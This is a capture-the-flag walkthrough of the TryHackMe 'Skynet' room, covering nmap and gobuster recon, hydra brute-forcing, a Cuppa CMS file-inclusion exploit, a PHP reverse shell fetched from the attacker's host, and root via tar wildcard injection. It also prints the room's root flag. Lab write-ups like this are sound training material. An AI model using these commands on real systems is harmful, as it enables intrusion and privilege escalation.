
# TryHackMe — Skynet | Full Walkthrough

**Author:** Adrian Korwel 
**Difficulty:** Medium  
**Objective:** Gain root access and retrieve the flags

---

## Enumeration (Initial Recon)

I started by scanning the target IP (10.10.3.106) using nmap:

```bash
nmap -sC -sV -oN skynet-scan.txt 10.10.3.106
```

**Open Ports:**
- 21 (FTP)
- 22 (SSH)
- 80 (HTTP)
- 110 (POP3)
- 143 (IMAP)

I noted the POP3 and IMAP services—possible email credentials. The HTTP server was my initial target, so I opened it in the browser and also ran gobuster:

```bash
gobuster dir -u http://10.10.3.106 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

This revealed the directory `/squirrelmail`, which exposed a webmail login page.

---

## SquirrelMail: Email Bruteforce Attempt

I tried bruteforcing the login using hydra:

```bash
hydra -l milesdyson -P /usr/share/wordlists/rockyou.txt 10.10.3.106 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^:Unknown user"
```

I didn’t get a valid login here, so I moved on.

---

## BurpSuite + Hydra Attack on Admin Panel

I found an admin login panel at:

```
http://10.10.3.106/45kra24zxs28v3yd/administrator/
```

Using BurpSuite, I captured the request:

```http
POST /45kra24zxs28v3yd/administrator/
user=admin&password=admin&task=login
```

From this, I crafted a hydra command:

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.3.106 http-post-form "/45kra24zxs28v3yd/administrator/:user=^USER^&password=^PASS^&task=login:Incorrect username or password"
```

Still no valid credentials, so I suspected a possible vulnerability in the CMS instead.

---

## Cuppa CMS Vulnerability — LFI Exploit

After some research on the page source, I found the CMS was Cuppa CMS.

I searched for exploits:

```bash
searchsploit cuppa
```

Which led me to the following LFI vulnerability:

```bash
/cuppa/alerts/alertConfigField.php?urlConfig=[LFI]
```

I confirmed it with:

```bash
curl "http://10.10.3.106/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../etc/passwd"
```

This successfully dumped `/etc/passwd` — LFI confirmed

---

## Remote Code Execution via PHP Wrapper (LFI + RCE)

My goal now was to turn this LFI into RCE. I checked `/proc/self/environ` to try and inject a PHP payload via the User-Agent:

```bash
curl -A '<?php system($_GET["cmd"]); ?>' "http://10.10.3.106/45kra24zxs28v3yd/"
```

Then I accessed:

```bash
http://10.10.3.106/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../proc/self/environ&cmd=id
```

But I didn’t get code execution here, so I moved on to remote inclusion.

---

## Remote File Inclusion + PHP Reverse Shell

I used the LFI param to try RFI:

```bash
http://10.10.3.106/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.13.86.132:8000/php-reverse-shell.php
```

I hosted the reverse shell locally:

```bash
cd /usr/share/webshells/php
sudo cp php-reverse-shell.php ~/Documents
nano ~/Documents/php-reverse-shell.php  # set IP and port
cd ~/Documents
python3 -m http.server 8000
```

I listened on port 4444:

```bash
nc -lvnp 4444
```

After triggering the RFI URL, the reverse shell connected!

I had a shell as:  
**User:** www-data

---

## Privilege Escalation — Enumerating the Box

From the shell, I ran:

```bash
uname -a
whoami
```

Then I downloaded linpeas.sh:

```bash
wget http://10.13.86.132:8000/linpeas.sh -O /tmp/linpeas.sh
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

This showed a cron job running every minute as root:

```bash
*/1 * * * * root /home/milesdyson/backups/backup.sh
```

---

## Wildcard Injection in Tar — PrivEsc to Root

I inspected `/home/milesdyson/backups/backup.sh`:

```bash
cd /home/milesdyson/backups
cat backup.sh
```

It runs:

```bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *
```

Although I couldn't edit backup.sh, I could write into `/var/www/html`, which is where it runs the tar command. This is vulnerable to wildcard injection.

### Exploiting Tar’s --checkpoint-action

I did the following:

```bash
# Create a script that sets SUID on /bin/bash
echo -e '#!/bin/bash
chmod +s /bin/bash' > /var/www/html/root_shell.sh

# Craft the tar wildcard options
touch "/var/www/html/--checkpoint=1"
touch "/var/www/html/--checkpoint-action=exec=sh root_shell.sh"
```

After waiting 1 minute for the cron job, I checked:

```bash
ls -l /bin/bash
```

And saw the SUID bit set!

Now I ran:

```bash
/bin/bash -p
whoami
```

And I got: **root**

---

## Root Flag

Finally, I went to `/root` and grabbed the flag:

```bash
cd /root
cat root.txt
```

**Flag:** `3f0372db24753accc7179a282cd6a949`

---

## Summary

| Stage           | Method                                      |
|----------------|---------------------------------------------|
| Enumeration     | Nmap, Gobuster                              |
| Initial Access  | LFI + RFI via Cuppa CMS                     |
| Reverse Shell   | php-reverse-shell.php over HTTP             |
| Post-Enum       | linpeas.sh                                  |
| PrivEsc         | Wildcard Injection in tar via cron          |
| Root            | SUID /bin/bash trick                        |
| Root Flag       | ✅ Captured                                 |

---

## Lessons Learned

- Always test `/proc/self/environ` for LFI-RCE
- Wildcard injection in tar is powerful when `*` is used in cronjobs
- Having write access to a cron-executed directory can be lethal
- Enumeration is everything: linpeas and manual review were crucial
